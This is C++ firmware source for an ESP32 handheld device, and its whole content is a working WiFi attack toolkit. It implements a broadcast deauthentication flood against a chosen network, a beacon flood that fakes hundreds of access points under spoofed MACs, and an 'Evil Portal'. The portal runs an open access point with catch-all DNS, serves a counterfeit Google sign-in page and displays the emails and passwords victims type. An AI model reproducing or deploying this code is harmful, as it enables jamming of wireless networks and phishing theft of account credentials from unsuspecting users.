#include "attacks.h"
#include "ui.h"
#include "utils.h"

// ════════════════════════════════════════════════════════════
//  Frames IEEE 802.11
// ════════════════════════════════════════════════════════════

// ─── Deauth broadcast ───────────────────────────────────────
const uint8_t DEAUTH_FRAME[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00,
  0x07, 0x00
};

// ─── Beacon frame template (108 octets) ─────────────────────
// Fake AP beacon : Frame Control + Duration + DA + SA + BSSID
// + Seq + Timestamp + Interval + Capability + SSID IE + Rates IE
static uint8_t beaconFrame[109] = {
  // Frame Control
  0x80, 0x00,
  // Duration
  0x00, 0x00,
  // Destination : broadcast
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  // Source MAC (modifié dynamiquement)
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0x00,
  // BSSID (même que source)
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0x00,
  // Sequence number
  0x00, 0x00,
  // Timestamp (8 octets)
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  // Beacon interval : 100ms
  0x64, 0x00,
  // Capability : ESS + privacy
  0x31, 0x04,
  // SSID IE : tag=0, len=32, puis 32 octets SSID
  0x00, 0x20,
  // SSID (32 octets, remplis dynamiquement)
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  // Supported Rates IE
  0x01, 0x08,
  0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C
};

// Offset SSID dans la frame
#define BEACON_SSID_OFFSET 38
#define BEACON_MAC_OFFSET  10
#define BEACON_BSSID_OFFSET 16

// ─── Liste de préfixes SSID pour le beacon flood ────────────
static const char* const SSID_PREFIXES[] PROGMEM = {
  "FBI_Surveillance_Van_",
  "FreeWiFi_",
  "Linksys_",
  "NETGEAR_",
  "TP-Link_",
  "Xfinity_",
  "ATT_WiFi_",
  "Vodafone_",
  "SFR_Box_",
  "Livebox_",
  "Orange_",
  "Guest_Network_",
  "Corp_WiFi_",
  "iPhone_",
  "AndroidAP_",
};
static const int SSID_PREFIX_COUNT = 15;

// ─── Evil Portal HTML (PROGMEM pour économiser la RAM) ──────
static const char EVIL_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Sign in - Google Accounts</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Roboto',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
    .card{width:360px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
    .logo{text-align:center;margin-bottom:16px;font-size:28px;color:#4285F4;font-weight:500}
    h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:8px}
    h2{font-size:16px;font-weight:400;text-align:center;color:#202124;margin-bottom:28px}
    input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:14px;outline:none}
    input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
    .hint{font-size:14px;color:#5f6368;margin-bottom:24px}
    .hint a{color:#1a73e8;text-decoration:none}
    .actions{display:flex;justify-content:space-between;align-items:center}
    .create{color:#1a73e8;text-decoration:none;font-size:14px}
    button{background:#1a73e8;color:#fff;border:none;padding:0 24px;height:36px;border-radius:4px;font-size:14px;cursor:pointer}
    button:hover{background:#1765cc}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">G</div>
    <h1>Sign in</h1>
    <h2>with your Google Account</h2>
    <form method="GET" action="/get">
      <input name="email"    type="text"     placeholder="Email or phone"     required autocomplete="off">
      <input name="password" type="password" placeholder="Enter your password" required autocomplete="off">
      <div class="hint">Not your computer? <a href="#">Use Guest mode</a></div>
      <div class="actions">
        <a class="create" href="#">Create account</a>
        <button type="submit">Next</button>
      </div>
    </form>
  </div>
</body>
</html>
)rawliteral";

// ════════════════════════════════════════════════════════════
//  Helpers internes
// ════════════════════════════════════════════════════════════

// Barres de signal RSSI → 0-4
static int _rssiToBars(int rssi) {
  if (rssi >= -55) return 4;
  if (rssi >= -65) return 3;
  if (rssi >= -75) return 2;
  if (rssi >= -85) return 1;
  return 0;
}

// Dessin barres de signal (4 barres, 12px large)
static void _drawSignal(int x, int y, int bars, bool selected) {
  uint16_t col = selected ? C_BLACK : accent();
  for (int i = 0; i < 4; i++) {
    int bh = 3 + i * 2;
    int bx = x + i * 4;
    int by = y + (8 - bh);
    if (i < bars)
      spr.fillRect(bx, by, 3, bh, col);
    else
      spr.fillRect(bx, by, 3, bh, selected ? 0x4208 : C_DARK);
  }
}

// ════════════════════════════════════════════════════════════
//  Sous-menu WiFi Attack — 3 options maintenant
// ════════════════════════════════════════════════════════════
void attacks_wifiSubMenu() {
  static const MenuItem SUB[3] = {
    { "Deauth Attack",  "W>" },
    { "Beacon Flood",   "BF" },
    { "Evil Portal",    "EP" },
  };
  int sel = 0;

  while (true) {
    ui_drawMenu(SUB, 3, sel);

    if (utils_btnA()) {
      if      (sel == 0) attacks_deauthScan();
      else if (sel == 1) attacks_beaconFlood();
      else               attacks_evilPortal();
      return;
    }
    if (utils_btnB()) sel = (sel + 1) % 3;
    delay(20);
  }
}

// ════════════════════════════════════════════════════════════
//  Deauth Attack — avec barres de signal
// ════════════════════════════════════════════════════════════
static void _drawNetList(int n, int sel, int pageStart) {
  ui_begin();
  ui_topbar("DEAUTH ATTACK", "Select Target");
  ui_botbar("Attack!", "Next");

  const int ITEM_H = 20;
  const int VIS    = 5;
  const int startY = UI_CONTENT_Y + 2;

  for (int i = pageStart; i < pageStart + VIS && i < n; i++) {
    int  y  = startY + (i - pageStart) * ITEM_H;
    bool hl = (i == sel);

    spr.fillRect(0, y, SCREEN_W, ITEM_H - 1, hl ? accent() : ((i % 2 == 0) ? C_DARK : C_BLACK));

    // SSID
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = F("(Hidden)");
    if (ssid.length() > 16)  ssid = ssid.substring(0, 15) + "~";

    spr.setTextDatum(TL_DATUM);
    spr.setTextSize(1);
    spr.setTextColor(hl ? C_BLACK : C_WHITE, hl ? accent() : C_DARK);
    spr.drawString(String(i + 1) + ". " + ssid, 6, y + 6);

    // Channel
    char ch[8]; sprintf(ch, "Ch%d", WiFi.channel(i));
    spr.setTextColor(hl ? C_BLACK : C_LGRAY, hl ? accent() : C_DARK);
    spr.setTextDatum(TR_DATUM);
    spr.drawString(ch, SCREEN_W - 56, y + 6);

    // Barres de signal
    _drawSignal(SCREEN_W - 50, y + 5, _rssiToBars(WiFi.RSSI(i)), hl);
  }

  // Compteur réseaux
  char cnt[16]; sprintf(cnt, "%d networks", n);
  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(1);
  spr.setTextColor(C_GRAY, C_BLACK);
  spr.drawString(cnt, SCREEN_W / 2, UI_CONTENT_Y + VIS * ITEM_H + 6);

  // Scrollbar
  if (n > VIS) {
    int sbH   = VIS * ITEM_H;
    int sbY   = UI_CONTENT_Y + 2 + (sbH * pageStart / n);
    int sbLen = sbH * VIS / n;
    spr.fillRect(SCREEN_W - 2, UI_CONTENT_Y + 2, 2, sbH, C_DARK);
    spr.fillRect(SCREEN_W - 2, sbY, 2, sbLen, accent());
  }

  ui_push();
}

void attacks_deauthScan() {
  // Écran de scan
  ui_begin();
  ui_topbar("DEAUTH ATTACK", "Scanning...");
  ui_botbar(nullptr);
  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(2);
  spr.setTextColor(accent(), C_BLACK);
  spr.drawString("Scanning WiFi...", SCREEN_W / 2, SCREEN_H / 2 - 10);
  spr.setTextSize(1);
  spr.setTextColor(C_GRAY, C_BLACK);
  spr.drawString("Please wait", SCREEN_W / 2, SCREEN_H / 2 + 12);
  ui_push();

  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();

  if (n <= 0) {
    ui_begin();
    ui_topbar("DEAUTH ATTACK");
    ui_bigText("No Networks Found", SCREEN_H / 2, C_GRAY, 2);
    ui_botbar("Back");
    ui_push();
    utils_waitBtn(PIN_BUTTON_A);
    return;
  }

  int target = attacks_selectNetwork(n);

  // Confirmation
  ui_begin();
  ui_topbar("ATTACKING", WiFi.SSID(target).c_str());
  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(1);
  spr.setTextColor(C_LGRAY, C_BLACK);
  spr.drawString("Target BSSID:", SCREEN_W / 2, UI_CONTENT_Y + 20);
  spr.setTextColor(danger(), C_BLACK);
  char mac[20];
  uint8_t* bssid = WiFi.BSSID(target);
  sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  spr.drawString(mac, SCREEN_W / 2, UI_CONTENT_Y + 36);
  char chbuf[16]; sprintf(chbuf, "Channel %d | %ddBm", WiFi.channel(target), WiFi.RSSI(target));
  spr.setTextColor(C_GRAY, C_BLACK);
  spr.drawString(chbuf, SCREEN_W / 2, UI_CONTENT_Y + 52);
  ui_botbar("Stop");
  ui_push();
  delay(1500);

  // Attaque
  int ch = WiFi.channel(target);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_max_tx_power(78);

  uint32_t count   = 0;
  uint32_t lastUpd = millis();
  uint32_t startT  = millis();
  static int pulse = 0;

  while (!utils_btnA()) {
    esp_wifi_80211_tx(WIFI_IF_STA, DEAUTH_FRAME, sizeof(DEAUTH_FRAME), false);
    count++;

    if (millis() - lastUpd >= 150) {
      lastUpd = millis();
      pulse = (pulse + 1) % 20;
      uint32_t elapsed = (millis() - startT) / 1000;

      ui_begin();
      ui_topbar("ATTACKING", WiFi.SSID(target).c_str());

      spr.drawCircle(SCREEN_W / 2, SCREEN_H / 2 - 14, 30 + pulse, danger());
      spr.drawCircle(SCREEN_W / 2, SCREEN_H / 2 - 14, 18,         danger());
      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(2);
      spr.setTextColor(danger(), C_BLACK);
      spr.drawString("JAMMING", SCREEN_W / 2, SCREEN_H / 2 - 14);

      char statBuf[32];
      sprintf(statBuf, "%lu pkts  |  %lus", count, elapsed);
      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      spr.drawString(statBuf, SCREEN_W / 2, SCREEN_H / 2 + 20);

      // Barre de paquets (visuel)
      int barW = min((int)(count / 50), SCREEN_W - 40);
      spr.fillRect(20, SCREEN_H / 2 + 32, barW, 4, danger());

      ui_botbar("Stop");
      ui_push();
    }
    delay(1);
  }

  WiFi.scanDelete();
  ui_toast("Attack stopped", accent());
}

int attacks_selectNetwork(int n) {
  int sel       = 0;
  int pageStart = 0;
  const int VIS = 5;

  while (true) {
    pageStart = sel - VIS / 2;
    if (pageStart < 0)       pageStart = 0;
    if (pageStart + VIS > n) pageStart = max(0, n - VIS);
    _drawNetList(n, sel, pageStart);

    if (utils_btnA()) return sel;
    if (utils_btnB()) sel = (sel + 1) % n;
    delay(20);
  }
}

// ════════════════════════════════════════════════════════════
//  Beacon Flood — génère des centaines de faux réseaux WiFi
// ════════════════════════════════════════════════════════════
void attacks_beaconFlood() {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_max_tx_power(78);

  uint32_t count    = 0;
  uint32_t lastUpd  = millis();
  uint32_t startT   = millis();
  int      channel  = 1;
  uint8_t  macSuffix = 0;

  // Préfixe courant
  int prefixIdx = 0;

  while (!utils_btnA()) {
    // Construire un SSID unique : prefixe + numéro aléatoire
    char ssid[33];
    // Lire le prefixe depuis PROGMEM
    char prefix[24];
    strncpy_P(prefix, SSID_PREFIXES[prefixIdx], sizeof(prefix) - 1);
    prefix[sizeof(prefix) - 1] = 0;
    int num = random(100, 9999);
    snprintf(ssid, sizeof(ssid), "%s%d", prefix, num);

    int ssidLen = min((int)strlen(ssid), 32);

    // MAC aléatoire (localement administrée)
    uint8_t mac[6] = {
      (uint8_t)(0x02 | (random(0, 64) << 2)),
      (uint8_t)random(0, 256),
      (uint8_t)random(0, 256),
      (uint8_t)random(0, 256),
      (uint8_t)random(0, 256),
      macSuffix++
    };

    // Injecter la MAC dans la frame
    memcpy(beaconFrame + BEACON_MAC_OFFSET,   mac, 6);
    memcpy(beaconFrame + BEACON_BSSID_OFFSET, mac, 6);

    // Injecter le SSID (longueur variable)
    beaconFrame[36] = 0x00;          // SSID tag
    beaconFrame[37] = (uint8_t)ssidLen;
    memset(beaconFrame + 38, 0, 32);
    memcpy(beaconFrame + 38, ssid, ssidLen);

    // Taille réelle de la frame = 38 + ssidLen + 10 (rates IE)
    int frameLen = 38 + ssidLen + 10;

    // Changer de canal toutes les 10 frames pour couvrir tout le spectre
    if (count % 10 == 0) {
      channel = (channel % 13) + 1;
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }

    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, frameLen, false);
    count++;

    // Changer de préfixe à chaque itération
    prefixIdx = (prefixIdx + 1) % SSID_PREFIX_COUNT;

    // Mise à jour de l'affichage
    if (millis() - lastUpd >= 200) {
      lastUpd = millis();
      uint32_t elapsed = (millis() - startT) / 1000;

      ui_begin();
      ui_topbar("BEACON FLOOD", "Broadcasting...");

      // Icône "ondes"
      int cx = SCREEN_W / 2, cy = SCREEN_H / 2 - 16;
      for (int r = 8; r <= 28; r += 10) {
        spr.drawCircle(cx, cy, r, accent());
      }
      spr.fillCircle(cx, cy, 4, accent2());

      // Stats
      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(2);
      spr.setTextColor(accent(), C_BLACK);
      char cntBuf[16]; sprintf(cntBuf, "%lu APs", count);
      spr.drawString(cntBuf, SCREEN_W / 2, SCREEN_H / 2 + 12);

      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      char infoBuf[32]; sprintf(infoBuf, "Ch %d  |  %lus", channel, elapsed);
      spr.drawString(infoBuf, SCREEN_W / 2, SCREEN_H / 2 + 30);

      // SSID courant affiché
      spr.setTextColor(C_GRAY, C_BLACK);
      spr.drawString(ssid, SCREEN_W / 2, SCREEN_H / 2 + 44);

      ui_botbar("Stop");
      ui_push();
    }

    delay(2);
  }

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  ui_toast("Flood stopped", accent());
}

// ════════════════════════════════════════════════════════════
//  Evil Portal
// ════════════════════════════════════════════════════════════
static String ep_lastEmail;
static String ep_lastPass;
static bool   ep_gotCreds = false;

static void _handleRoot() {
  httpServer.send_P(200, "text/html", EVIL_PORTAL_HTML);
}

static void _handleGet() {
  ep_lastEmail = httpServer.arg("email");
  ep_lastPass  = httpServer.arg("password");
  ep_gotCreds  = true;
  httpServer.send(200, "text/html",
    F("<html><body style='font-family:Roboto;text-align:center;margin-top:60px'>"
      "<h2>Verifying your account...</h2><p>Please wait.</p></body></html>"));
}

static void _handleNotFound() {
  IPAddress ip = WiFi.softAPIP();
  httpServer.sendHeader("Location", String("http://") + ip.toString(), true);
  httpServer.send(302, "text/plain", "");
}

void attacks_evilPortal() {
  const char* AP_SSID = "Free_WiFi";
  ep_gotCreds = false;

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  IPAddress apIP = WiFi.softAPIP();

  dnsServer.start(DNS_PORT, "*", apIP);
  httpServer.on("/",    _handleRoot);
  httpServer.on("/get", _handleGet);
  httpServer.onNotFound(_handleNotFound);
  httpServer.begin();

  uint32_t capCount = 0;

  while (!utils_btnA()) {
    dnsServer.processNextRequest();
    httpServer.handleClient();

    if (ep_gotCreds) {
      capCount++;
      ep_gotCreds = false;

      ui_begin();
      ui_topbar("EVIL PORTAL", "Credentials!");
      ui_card(10, UI_CONTENT_Y + 4, SCREEN_W - 20, 60, danger());

      spr.setTextDatum(TL_DATUM);
      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_DARK);
      spr.drawString("Email:", 16, UI_CONTENT_Y + 10);
      spr.setTextColor(C_WHITE, C_DARK);
      spr.drawString(ep_lastEmail.substring(0, 34), 16, UI_CONTENT_Y + 22);
      spr.setTextColor(C_LGRAY, C_DARK);
      spr.drawString("Pass:", 16, UI_CONTENT_Y + 36);
      spr.setTextColor(accent(), C_DARK);
      spr.drawString(ep_lastPass.substring(0, 34), 16, UI_CONTENT_Y + 48);

      char capBuf[24]; sprintf(capBuf, "Total: %lu captures", capCount);
      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(1);
      spr.setTextColor(C_GRAY, C_BLACK);
      spr.drawString(capBuf, SCREEN_W / 2, UI_CONTENT_Y + 76);

      ui_botbar("Stop");
      ui_push();
      delay(4000);

    } else {
      ui_begin();
      ui_topbar("EVIL PORTAL", "Running");

      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      spr.drawString("SSID:", SCREEN_W / 2, UI_CONTENT_Y + 14);
      spr.setTextSize(2);
      spr.setTextColor(accent(), C_BLACK);
      spr.drawString(AP_SSID, SCREEN_W / 2, UI_CONTENT_Y + 28);

      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      char capBuf[22]; sprintf(capBuf, "Captures: %lu", capCount);
      spr.drawString(capBuf, SCREEN_W / 2, UI_CONTENT_Y + 52);
      spr.setTextColor(C_GRAY, C_BLACK);
      spr.drawString(apIP.toString().c_str(), SCREEN_W / 2, UI_CONTENT_Y + 66);

      // Indicateur clignotant
      static bool blink = false; blink = !blink;
      spr.fillCircle(SCREEN_W - 16, UI_CONTENT_Y + 10, 4, blink ? C_GREEN : C_DARK);

      ui_botbar("Stop");
      ui_push();
      delay(300);
    }
  }

  httpServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  delay(300);
  ui_toast("Portal stopped", accent());
}

// ════════════════════════════════════════════════════════════
//  BLE Attack (placeholder)
// ════════════════════════════════════════════════════════════
void attacks_bleMenu() {
  ui_begin();
  ui_topbar("BLE ATTACK", "Coming in v2.1");

  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(2);
  spr.setTextColor(C_GRAY, C_BLACK);
  spr.drawString("BLE Flood", SCREEN_W / 2, SCREEN_H / 2 - 14);
  spr.setTextSize(1);
  spr.setTextColor(C_LGRAY, C_BLACK);
  spr.drawString("Feature in development", SCREEN_W / 2, SCREEN_H / 2 + 8);
  spr.drawString("Coming in v2.1", SCREEN_W / 2, SCREEN_H / 2 + 22);

  ui_botbar("Back");
  ui_push();
  utils_waitBtn(PIN_BUTTON_A);
}
